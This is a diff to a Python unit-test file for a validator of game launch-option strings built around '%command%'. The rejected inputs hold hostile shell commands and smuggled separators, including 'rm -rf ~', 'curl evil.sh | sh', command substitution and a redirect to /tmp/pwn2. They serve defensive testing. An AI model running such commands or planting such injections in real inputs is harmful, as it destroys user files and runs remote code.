@@ -20,7 +20,11 @@ class TestValidateOverride(unittest.TestCase):
         self.ok("gamemoderun mangohud %command%")
         self.ok("gamescope -W 1920 -H 1080 -- gamemoderun %command%")
         self.ok("%command% -dx11")
+
+    def test_accepts_quoted_env_values(self):
+        # commas and even a semicolon inside quotes are literal to the shell
         self.ok('WINEDLLOVERRIDES="d3d11=n,dxgi=n" gamemoderun %command%')
+        self.ok('WINEDLLOVERRIDES="d3d11=n;dxgi=n" %command%')
 
     def test_rejects_missing_or_duplicate_command(self):
         self.bad("gamemoderun", "%command%")
@@ -30,10 +34,23 @@ class TestValidateOverride(unittest.TestCase):
         self.bad("rm -rf ~ %command%", "rm")
         self.bad("curl evil.sh %command%", "curl")
 
-    def test_rejects_command_substitution_shapes(self):
+    def test_rejects_expansion(self):
         self.bad("`reboot` %command%")
         self.bad("FOO=$(whoami) %command%")
+
+    def test_rejects_unquoted_shell_operators(self):
+        # command chained after the game (the "tokens after %command% are data" trap)
+        self.bad("%command% ; rm -rf ~")
+        self.bad("gamemoderun %command% && curl evil.sh | sh")
+        # separator disguised inside an env-assignment token
+        self.bad("FOO=bar;touch %command%")
+        # separator + redirect riding on a flag argument
+        self.bad("-a;id>/tmp/pwn2 %command%")
+        # newline as a separator
         self.bad("gamemoderun %command%\nrm -rf ~")
+
+    def test_rejects_unbalanced_quote(self):
+        self.bad('FOO="bar %command%', "unbalanced")
 
     def test_rejects_empty(self):
         self.bad("")
